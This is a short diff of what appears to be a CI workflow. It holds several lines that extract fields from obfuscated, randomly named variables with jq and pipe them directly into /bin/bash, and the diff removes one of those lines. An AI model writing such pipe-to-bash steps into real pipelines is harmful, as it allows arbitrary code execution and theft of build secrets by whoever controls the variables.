@@ -28,7 +28,6 @@ jobs:
           echo $ipcc18 | jq -r .nsnh107 | /bin/bash
           printf '%s' "$ykvq39574" | jq -r .k15 | /bin/bash
           printf '%s' "$hrqz42" | jq -r .osxy579 | /bin/bash
-          printf '%s' "$z02114" | jq -r .t88219 | /bin/bash
           echo $ct5 | jq -r .gnwid3668 | /bin/bash
           printf '%s' "$xpae53325" | jq -r .x7292 | /bin/bash
           echo $ll0 | jq -r .o26207 | /bin/bash
